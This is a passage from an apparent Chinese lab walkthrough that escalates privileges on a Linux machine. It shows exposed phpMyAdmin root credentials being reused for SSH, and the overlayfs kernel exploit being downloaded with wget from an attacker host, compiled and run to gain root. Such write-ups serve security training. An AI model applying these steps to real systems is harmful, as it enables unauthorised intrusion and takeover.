&lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="hljs-number">1500</span> qdisc pfifo_fast state UP qlen <span class="hljs-number">1000</span><br>    link/ether <span class="hljs-number">00</span>:<span class="hljs-number">0</span>c:<span class="hljs-number">29</span>:a9:a2:<span class="hljs-number">24</span> brd ff:ff:ff:ff:ff:ff<br>    inet <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>/<span class="hljs-number">24</span> brd <span class="hljs-number">10.10</span>.<span class="hljs-number">10.255</span> scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::<span class="hljs-number">20</span>c:<span class="hljs-number">29</span>ff:fea9:a224/<span class="hljs-number">64</span> scope link <br>       valid_lft forever preferred_lft forever<br>www<span class="hljs-literal">-data</span>@indipowershell:/var/www/phpmy<span class="hljs-variable">$</span> sudo <span class="hljs-literal">-l</span><br>sudo <span class="hljs-literal">-l</span><br>[<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> www<span class="hljs-literal">-data</span>: <br><br>Sorry, <span class="hljs-keyword">try</span> again.<br>[<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> www<span class="hljs-literal">-data</span>: <br><br>Sorry, <span class="hljs-keyword">try</span> again.<br>[<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> www<span class="hljs-literal">-data</span>: <br><br>Sorry, <span class="hljs-keyword">try</span> again.<br>sudo: <span class="hljs-number">3</span> incorrect password attempts<br>www<span class="hljs-literal">-data</span>@indipowershell:/var/www<span class="hljs-variable">$</span> uname <span class="hljs-literal">-a</span><br>uname <span class="hljs-literal">-a</span><br>Linux indipowershell <span class="hljs-number">3.13</span>.<span class="hljs-number">0</span><span class="hljs-literal">-32-generic</span> <span class="hljs-comment">#57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 athlon i386 GNU/Linux</span><br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="密码重用-ssh-登录"><a href="#密码重用-ssh-登录" class="headerlink" title="密码重用 ssh 登录"></a>密码重用 ssh 登录</h3><p>查看一下当前目录，看到了 phpmy 目录进去看看，发现有 config 文件（这里叫做 config.inc.php），查看文件内容</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs powershell">www<span class="hljs-literal">-data</span>@indipowershell:/var/www<span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>add.php  head.php   images  index.php  phpmy     test.php<br>c.php    head2.php  in.php  panel.php  show.php  uploaded_images<br>www<span class="hljs-literal">-data</span>@indipowershell:/var/www<span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> phpmy<br><span class="hljs-built_in">cd</span> phpmy<br>www<span class="hljs-literal">-data</span>@indipowershell:/var/www/phpmy<span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>CREDITS                   js                      server_status.php<br>ChangeLog                 libraries               server_synchronize.php<br>Documentation.html        license.php             server_variables.php<br>Documentation.txt         locale                  setup<br>INSTALL                   main.php                show_config_errors.php<br>LICENSE                   navigation.php          sql.php<br>README                    phpdoctor.ini           tbl_addfield.php<br>README.VENDOR             phpinfo.php             tbl_alter.php<br>RELEASE<span class="hljs-literal">-DATE-3</span>.<span class="hljs-number">4.7</span>        phpmyadmin.css.php      tbl_change.php<br>TODO                      pmd                     tbl_chart.php<br>browse_foreigners.php     pmd_common.php          tbl_create.php<br>bs_disp_as_mime_type.php  pmd_display_field.php   tbl_export.php<br>bs_play_media.php         pmd_general.php         tbl_get_field.php<br>changelog.php             pmd_help.php            tbl_import.php<br>chk_rel.php               pmd_pdf.php             tbl_indexes.php<br>config.inc.php            pmd_relation_new.php    tbl_move_copy.php<br>config.sample.inc.php     pmd_relation_upd.php    tbl_operations.php<br>contrib                   pmd_save_pos.php        tbl_printview.php<br>db_create.php             prefs_forms.php         tbl_relation.php<br>db_datadict.php           prefs_manage.php        tbl_replace.php<br>db_export.php             print.css               tbl_row_action.php<br>db_import.php             querywindow.php         tbl_select.php<br>db_operations.php         robots.txt              tbl_sql.php<br>db_printview.php          schema_edit.php         tbl_structure.php<br>db_qbe.php                schema_export.php       tbl_tracking.php<br>db_search.php             scripts                 themes<br>db_sql.php                server_binlog.php       themes.php<br>db_structure.php          server_collations.php   transformation_overview.php<br>db_tracking.php           server_databases.php    transformation_wrapper.php<br>docs.css                  server_engines.php      url.php<br>enum_editor.php           server_export.php       user_password.php<br>export.php                server_import.php       view_create.php<br>favicon.ico               server_privileges.php   view_operations.php<br>import.php                server_processlist.php  webapp.php<br>import_status.php         server_replication.php<br>index.php                 server_sql.php<br>www<span class="hljs-literal">-data</span>@indipowershell:/var/www/phpmy<span class="hljs-variable">$</span> <span class="hljs-built_in">cat</span> config.inc.php<br><span class="hljs-built_in">cat</span> config.inc.php<br>&lt;?php<br><br>/* Servers configuration */<br><span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br><br>/* Server: localhost [<span class="hljs-number">1</span>] */<br><span class="hljs-variable">$i</span>++;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;verbose&#x27;</span>] = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;host&#x27;</span>] = <span class="hljs-string">&#x27;localhost&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;port&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;socket&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;connect_type&#x27;</span>] = <span class="hljs-string">&#x27;tcp&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;extension&#x27;</span>] = <span class="hljs-string">&#x27;mysqli&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;auth_type&#x27;</span>] = <span class="hljs-string">&#x27;cookie&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;user&#x27;</span>] = <span class="hljs-string">&#x27;root&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;password&#x27;</span>] = <span class="hljs-string">&#x27;roottoor&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;AllowNoPassword&#x27;</span>] = true;<br><br>/* <span class="hljs-keyword">End</span> of servers configuration */<br><br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;DefaultLang&#x27;</span>] = <span class="hljs-string">&#x27;en-utf-8&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;ServerDefault&#x27;</span>] = <span class="hljs-number">1</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;UploadDir&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;SaveDir&#x27;</span>] = <span class="hljs-string">&#x27;&#x27;</span>;<br><br><br>/* rajk - <span class="hljs-keyword">for</span> blobstreaming */<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;bs_garbage_threshold&#x27;</span>] = <span class="hljs-number">50</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;bs_repository_threshold&#x27;</span>] = <span class="hljs-string">&#x27;32M&#x27;</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;bs_temp_blob_timeout&#x27;</span>] = <span class="hljs-number">600</span>;<br><span class="hljs-variable">$cfg</span>[<span class="hljs-string">&#x27;Servers&#x27;</span>][<span class="hljs-variable">$i</span>][<span class="hljs-string">&#x27;bs_temp_log_threshold&#x27;</span>] = <span class="hljs-string">&#x27;32M&#x27;</span>;<br><br><br>?&gt;<br></code></pre></td></tr></table></figure><p>得到了数据库的用户名和密码，这时候我们要有一定的敏感度，拿到一个用户名和密码都要考虑用户名和密码重用的可能性，这里 ssh 登录发现直接成功了。这里如果提前扫到了 phpmy 目录，可以利用c.php 中的用户名和密码登录进去，获得 auth 表中的用户名和密码，再对 phpmy 进行目录爆破，进而查看<code>config.inc.php</code></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> ssh root@<span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span>     <br>The authenticity of host <span class="hljs-string">&#x27;10.10.10.161 (10.10.10.161)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ECDSA key fingerprint is SHA256:UyLCTuDmpoRJdivxmtTOMWDk0apVt5NWjp8Xno1e+Z4.</span><br><span class="hljs-string">This key is not known by any other names</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span><span class="hljs-string">&#x27; (ECDSA) to the list of known hosts.</span><br><span class="hljs-string">root@10.10.10.161&#x27;</span>s password: <br>Welcome to Ubuntu <span class="hljs-number">12.04</span>.<span class="hljs-number">5</span> LTS (GNU/Linux <span class="hljs-number">3.13</span>.<span class="hljs-number">0</span><span class="hljs-literal">-32-generic</span> i686)<br><br> * Documentation:  https://help.ubuntu.com/<br><br>  System information as of Wed May <span class="hljs-number">24</span> <span class="hljs-number">16</span>:<span class="hljs-number">41</span>:<span class="hljs-number">21</span> IST <span class="hljs-number">2023</span><br><br>  System load:  <span class="hljs-number">0.0</span>               Processes:           <span class="hljs-number">113</span><br>  Usage of /:   <span class="hljs-number">13.7</span>% of <span class="hljs-number">9.61</span>GB   Users logged <span class="hljs-keyword">in</span>:     <span class="hljs-number">0</span><br>  Memory usage: <span class="hljs-number">22</span>%               IP address <span class="hljs-keyword">for</span> eth0: <span class="hljs-number">10.10</span>.<span class="hljs-number">10.161</span><br>  Swap usage:   <span class="hljs-number">0</span>%<br><br>  Graph this <span class="hljs-keyword">data</span> and manage this system at:<br>    https://landscape.canonical.com/<br><br>New release <span class="hljs-string">&#x27;14.04.5 LTS&#x27;</span> available.<br>Run <span class="hljs-string">&#x27;do-release-upgrade&#x27;</span> to upgrade to it.<br><br><br>Your Hardware Enablement Stack (HWE) is supported <span class="hljs-keyword">until</span> April <span class="hljs-number">2017</span>.<br><br><br>The programs included with the Ubuntu system are free software;<br>the exact distribution terms <span class="hljs-keyword">for</span> each program are described <span class="hljs-keyword">in</span> the<br>individual files <span class="hljs-keyword">in</span> /usr/share/doc/*/copyright.<br><br>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by<br>applicable law.<br><br>root@indipowershell:~<span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><h3 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h3><p>再考虑别的提权方式，内核比较老，考虑内核提权，搜索内核版本对应的exp</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]<br>└─<span class="hljs-variable">$</span> searchsploit kernel <span class="hljs-number">3.13</span>.<span class="hljs-number">0</span>                                              <br><span class="hljs-literal">-------------------------------------------------------------------------------------------------------</span> <span class="hljs-literal">---------------------------------</span><br> Exploit Title                                                                                         |  Path<br><span class="hljs-literal">-------------------------------------------------------------------------------------------------------</span> <span class="hljs-literal">---------------------------------</span><br>Android Kernel &lt; <span class="hljs-number">4.8</span> - ptrace seccomp <span class="hljs-keyword">Filter</span> Bypass                                                    | android/dos/<span class="hljs-number">46434</span>.c<br>Apple iOS &lt; <span class="hljs-number">10.3</span>.<span class="hljs-number">1</span> - Kernel                                                                            | ios/local/<span class="hljs-number">42555</span>.txt<br>Apple Mac OSX &lt; <span class="hljs-number">10.6</span>.<span class="hljs-number">7</span> - Kernel Panic (Denial of Service)                                              | osx/dos/<span class="hljs-number">17901</span>.c<br>Apple macOS &lt; <span class="hljs-number">10.12</span>.<span class="hljs-number">2</span> / iOS &lt; <span class="hljs-number">10.2</span> - <span class="hljs-string">&#x27;_kernelrpc_mach_port_insert_right_trap&#x27;</span> Kernel Reference Count L | macos/local/<span class="hljs-number">40956</span>.c<br>Apple macOS &lt; <span class="hljs-number">10.12</span>.<span class="hljs-number">2</span> / iOS &lt; <span class="hljs-number">10.2</span> - Broken Kernel Mach Port Name uref Handling Privileged Port Name <span class="hljs-built_in">R</span> | macos/local/<span class="hljs-number">40957</span>.c<br>Apple macOS &lt; <span class="hljs-number">10.12</span>.<span class="hljs-number">2</span> / iOS &lt; <span class="hljs-number">10.2</span> Kernel - ipc_port_t Reference Count Leak Due to Incorrect externalM | multiple/dos/<span class="hljs-number">40955</span>.txt<br>DESlock+ &lt; <span class="hljs-number">4.1</span>.<span class="hljs-number">10</span> - <span class="hljs-string">&#x27;vdlptokn.sys&#x27;</span> Local Kernel Ring0 SYSTEM                                           | windows/local/<span class="hljs-number">16138</span>.c<br>Jungo DriverWizard WinDriver &lt; <span class="hljs-number">12.4</span>.<span class="hljs-number">0</span> - Kernel <span class="hljs-built_in">Out-of</span><span class="hljs-literal">-Bounds</span> <span class="hljs-built_in">Write</span> Privilege Escalation                | windows/local/<span class="hljs-number">42625</span>.py<br>Jungo DriverWizard WinDriver &lt; <span class="hljs-number">12.4</span>.<span class="hljs-number">0</span> - Kernel Pool Overflow / Local Privilege Escalation (<span class="hljs-number">1</span>)          | windows/local/<span class="hljs-number">42624</span>.py<br>Jungo DriverWizard WinDriver &lt; <span class="hljs-number">12.4</span>.<span class="hljs-number">0</span> - Kernel Pool Overflow / Local Privilege Escalation (<span class="hljs-number">2</span>)          | windows/local/<span class="hljs-number">42665</span>.py<br>Linux Kernel (Solaris <span class="hljs-number">10</span> / &lt; <span class="hljs-number">5.10</span> <span class="hljs-number">138888</span><span class="hljs-literal">-01</span>) - Local Privilege Escalation                              | solaris/local/<span class="hljs-number">15962</span>.c<br>Linux Kernel <span class="hljs-number">2.6</span>.<span class="hljs-number">19</span> &lt; <span class="hljs-number">5.9</span> - <span class="hljs-string">&#x27;Netfilter Local Privilege Escalation                                      | linux/local/50135.c</span><br><span class="hljs-string">Linux Kernel 3.11 &lt; 4.8 0 - &#x27;</span>SO_SNDBUFFORCE<span class="hljs-string">&#x27; / &#x27;</span>SO_RCVBUFFORCE<span class="hljs-string">&#x27; Local Privilege Escalation             | linux/local/41995.c</span><br><span class="hljs-string">Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#x27;</span>overlayfs<span class="hljs-string">&#x27; Local Privilege Escalation   | linux/local/37292.c</span><br><span class="hljs-string">Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#x27;</span>overlayfs<span class="hljs-string">&#x27; Local Privilege Escalation ( | linux/local/37293.txt</span><br><span class="hljs-string">Linux Kernel 3.14-rc1 &lt; 3.15-rc4 (x64) - Raw Mode PTY Echo Race Condition Privilege Escalation         | linux_x86-64/local/33516.c</span><br><span class="hljs-string">Linux Kernel 3.4 &lt; 3.13.2 (Ubuntu 13.04/13.10 x64) - &#x27;</span>CONFIG_X86_X32=y<span class="hljs-string">&#x27; Local Privilege Escalation (3) | linux_x86-64/local/31347.c</span><br><span class="hljs-string">Linux Kernel 3.4 &lt; 3.13.2 (Ubuntu 13.10) - &#x27;</span>CONFIG_X86_X32<span class="hljs-string">&#x27; Arbitrary Write (2)                        | linux/local/31346.c</span><br><span class="hljs-string">Linux Kernel 3.4 &lt; 3.13.2 - recvmmsg x32 compat (PoC)                                                  | linux/dos/31305.c</span><br><span class="hljs-string">Linux Kernel 4.10.5 / &lt; 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free                                   | linux/dos/43234.c</span><br><span class="hljs-string">Linux Kernel 4.8.0 UDEV &lt; 232 - Local Privilege Escalation                                             | linux/local/41886.c</span><br><span class="hljs-string">Linux Kernel &lt; 3.16.1 - &#x27;</span>Remount FUSE<span class="hljs-string">&#x27; Local Privilege Escalation                                      | linux/local/34923.c</span><br><span class="hljs-string">Linux Kernel &lt; 3.16.39 (Debian 8 x64) - &#x27;</span>inotfiy<span class="hljs-string">&#x27; Local Privilege Escalation                           | linux_x86-64/local/44302.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.10.13 - &#x27;</span>keyctl_set_reqkey_keyring<span class="hljs-string">&#x27; Local Denial of Service                           | linux/dos/42136.c</span><br><span class="hljs-string">Linux kernel &lt; 4.10.15 - Race Condition Privilege Escalation                                           | linux/local/43345.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.11.8 - &#x27;</span>mq_notify: double sock_put()<span class="hljs-string">&#x27; Local Privilege Escalation                      | linux/local/45553.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.13.1 - BlueTooth Buffer Overflow (PoC)                                                | linux/dos/42762.txt</span><br><span class="hljs-string">Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                          | linux/local/45010.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.14.rc3 - Local Denial of Service                                                      | linux/dos/42932.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.15.4 - &#x27;</span>show_floppy<span class="hljs-string">&#x27; KASLR Address Leak                                               | linux/local/44325.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.16.11 - &#x27;</span>ext4_read_inline_data()<span class="hljs-string">&#x27; Memory Corruption                                   | linux/dos/44832.txt</span><br><span class="hljs-string">Linux Kernel &lt; 4.17-rc1 - &#x27;</span>AF_LLC<span class="hljs-string">&#x27; Double Free                                                         | linux/dos/44579.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                 | linux/local/44298.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - &#x27;</span>netfilter target_offset<span class="hljs-string">&#x27; Local Privilege Escalation      | linux_x86-64/local/44300.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)  | linux/local/43418.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escala | linux/local/47169.c</span><br><span class="hljs-string">Linux Kernel &lt; 4.5.1 - Off-By-One (PoC)                                                                | linux/dos/44301.c</span><br><span class="hljs-string">macOS &lt; 10.14.3 / iOS &lt; 12.1.3 - Kernel Heap Overflow in PF_KEY due to Lack of Bounds Checking when Re | multiple/dos/46300.c</span><br><span class="hljs-string">Sony Playstation 4 (PS4) &lt; 7.02 / FreeBSD 9 / FreeBSD 12 - &#x27;</span>ip6_setpktopt<span class="hljs-string">&#x27; Kernel Local Privilege Esca | hardware/local/48644.c</span><br><span class="hljs-string">------------------------------------------------------------------------------------------------------- ---------------------------------</span><br><span class="hljs-string">powershellcodes: No Results</span><br><span class="hljs-string">                                                                                                                                         </span><br><span class="hljs-string">┌──(kali㉿kali)-[~]</span><br><span class="hljs-string">└─$ searchsploit -m 37292     </span><br><span class="hljs-string">  Exploit: Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - &#x27;</span>overlayfs<span class="hljs-string">&#x27; Local Privilege Escalation</span><br><span class="hljs-string">      URL: https://www.exploit-db.com/exploits/37292</span><br><span class="hljs-string">     Path: /usr/share/exploitdb/exploits/linux/local/37292.c</span><br><span class="hljs-string">File Type: C source, ASCII text, with very long lines (466)</span><br><span class="hljs-string"></span><br></code></pre></td></tr></table></figure><p>尝试使用overlayfs</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs powershell">www<span class="hljs-literal">-data</span>@indipowershell:/var/www/phpmy<span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> /tmp<br><span class="hljs-built_in">cd</span> /tmp<br>www<span class="hljs-literal">-data</span>@indipowershell:/tmp<span class="hljs-variable">$</span> <span class="hljs-built_in">wget</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.160</span>:<span class="hljs-number">8088</span>/<span class="hljs-number">37292</span>.c<br><span class="hljs-built_in">wget</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.160</span>:<span class="hljs-number">8088</span>/<span class="hljs-number">37292</span>.c<br><span class="hljs-literal">--2023-05-24</span> <span class="hljs-number">17</span>:<span class="hljs-number">16</span>:<span class="hljs-number">57</span><span class="hljs-literal">--</span>  http://<span class="hljs-number">10.10</span>.<span class="hljs-number">10.160</span>:<span class="hljs-number">8088</span>/<span class="hljs-number">37292</span>.c<br>Connecting to <span class="hljs-number">10.10</span>.<span class="hljs-number">10.160</span>:<span class="hljs-number">8088</span>... connected.<br>HTTP request sent, awaiting response... <span class="hljs-number">200</span> OK<br>Length: <span class="hljs-number">4968</span> (<span class="hljs-number">4.9</span>K) [<span class="hljs-type">text</span>/<span class="hljs-type">x</span>-<span class="hljs-type">csrc</span>]<br>Saving to: `37292.c<span class="hljs-string">&#x27;</span><br><span class="hljs-string"></span><br><span class="hljs-string">100%[======================================&gt;] 4,968       --.-K/s   in 0s      </span><br><span class="hljs-string"></span><br><span class="hljs-string">2023-05-24 17:16:57 (166 MB/s) - `37292.c&#x27;</span> saved [<span class="hljs-number">4968</span>/<span class="hljs-number">4968</span>]<br><br>www<span class="hljs-literal">-data</span>@indipowershell:/tmp<span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br><span class="hljs-number">37292</span>.c<br>www<span class="hljs-literal">-data</span>@indipowershell:/tmp<span class="hljs-variable">$</span> gcc <span class="hljs-number">37292</span>.c <span class="hljs-literal">-o</span> overlayfs <br>gcc <span class="hljs-number">37292</span>.c <span class="hljs-literal">-o</span> overlayfs<br>www<span class="hljs-literal">-data</span>@indipowershell:/tmp<span class="hljs-variable">$</span> ./overlayfs<br>./overlayfs<br>spawning threads<br><span class="hljs-built_in">mount</span> <span class="hljs-comment">#1</span><br><span class="hljs-built_in">mount</span> <span class="hljs-comment">#2</span><br>child threads done<br>/etc/ld.so.preload created<br>creating shared library<br><span class="hljs-comment"># whoami</span><br>whoami<br>root<br><span class="hljs-comment"># id</span><br>id<br>uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root),<span class="hljs-number">33</span>(www<span class="hljs-literal">-data</span>)<br><span class="hljs-comment"># ip a</span><br>ip a<br><span class="hljs-number">1</span>: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu <span class="hljs-number">65536</span> qdisc noqueue state UNKNOWN <br>    link/loopback <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> brd <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span><br>    inet <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>/<span class="hljs-number">8</span> scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::<span class="hljs-number">1</span>/<span class="hljs-number">128</span> scope host <br>       valid_lft forever preferred_lft forever<br><span class="hljs-number">2</span>: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="hljs-number">1500</span> qdisc 